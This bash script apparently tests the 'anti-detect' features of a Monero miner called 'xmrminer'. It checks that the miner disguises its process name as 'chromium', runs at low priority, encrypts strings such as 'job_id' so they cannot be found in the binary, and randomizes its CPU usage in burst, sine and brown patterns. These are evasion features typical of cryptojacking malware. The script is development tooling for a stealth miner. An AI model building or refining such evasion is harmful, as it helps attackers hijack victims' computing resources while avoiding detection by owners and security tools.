#!/bin/bash
# Simple anti-detect test - one at a time, quiet output

set -e
PASS=0
FAIL=0

check() {
    local name="$1"
    local result="$2"
    if [ "$result" -eq 0 ]; then
        echo "[PASS] $name"
        PASS=$((PASS + 1))
    else
        echo "[FAIL] $name"
        FAIL=$((FAIL + 1))
    fi
}

make -j$(nproc) 2>/dev/null

echo "=== Anti-Detect Tests ==="
echo ""

# 1. Process name
./xmrminer -b -t 1 &>/dev/null &
PID=$!
sleep 2
COMM=$(cat /proc/$PID/comm 2>/dev/null)
kill $PID 2>/dev/null; wait $PID 2>/dev/null
[ "$COMM" = "chromium" ] && check "1. Process name = chromium" 0 || check "1. Process name = $COMM (expected chromium)" 1

# 2. Background priority
./xmrminer -b -t 1 &>/dev/null &
PID=$!
sleep 2
NICE=$(ps -o ni= -p $PID 2>/dev/null | tr -d " ")
kill $PID 2>/dev/null; wait $PID 2>/dev/null
[ "$NICE" = "19" ] && check "2. Nice = 19" 0 || check "2. Nice = $NICE (expected 19)" 1

# 3. Encrypted strings
strings xmrminer | grep -q "job_id"
[ $? -ne 0 ] && check "3. Encrypted strings (job_id hidden)" 0 || check "3. job_id visible in binary" 1

# 4. No crash with all features
./xmrminer -b -t 1 --randomize-cpu=burst &>/dev/null &
PID=$!
sleep 3
if kill -0 $PID 2>/dev/null; then
    kill $PID 2>/dev/null; wait $PID 2>/dev/null
    check "4. Burst mode no crash" 0
else
    wait $PID 2>/dev/null
    check "4. Burst mode crashed" 1
fi

# 5. Sine mode
./xmrminer -b -t 1 --randomize-cpu=sine &>/dev/null &
PID=$!
sleep 3
if kill -0 $PID 2>/dev/null; then
    kill $PID 2>/dev/null; wait $PID 2>/dev/null
    check "5. Sine mode no crash" 0
else
    wait $PID 2>/dev/null
    check "5. Sine mode crashed" 1
fi

# 6. Brown mode
./xmrminer -b -t 1 --randomize-cpu=brown &>/dev/null &
PID=$!
sleep 3
if kill -0 $PID 2>/dev/null; then
    kill $PID 2>/dev/null; wait $PID 2>/dev/null
    check "6. Brown mode no crash" 0
else
    wait $PID 2>/dev/null
    check "6. Brown mode crashed" 1
fi

echo ""
echo "=== Results: $PASS passed, $FAIL failed ==="
